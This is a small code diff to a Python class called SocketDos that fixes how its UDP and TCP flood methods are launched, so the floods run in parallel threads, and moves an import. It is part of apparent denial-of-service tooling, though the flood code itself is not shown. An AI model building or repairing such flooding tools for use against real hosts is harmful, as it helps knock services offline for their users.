@@ -5,7 +5,7 @@ import itertools
 import time
 from threading import Thread
 from src.utils import color_text
-from src.dos.constants import TCP, UDP
+from src.config import TCP, UDP
 
 class SocketDos():
 
@@ -55,9 +55,9 @@ class SocketDos():
             for _ in range(self.thread_number):
                 if self.protocol != False:
                     if self.protocol == UDP:
-                        thread = Thread(target=self.udp_flood())
+                        thread = Thread(target=self.udp_flood).start()
                     if self.protocol == TCP:
-                        thread = Thread(target=self.tcp_flood())
+                        thread = Thread(target=self.tcp_flood).start()
                     # thread.start()
                 else:
                     print('Bad method')
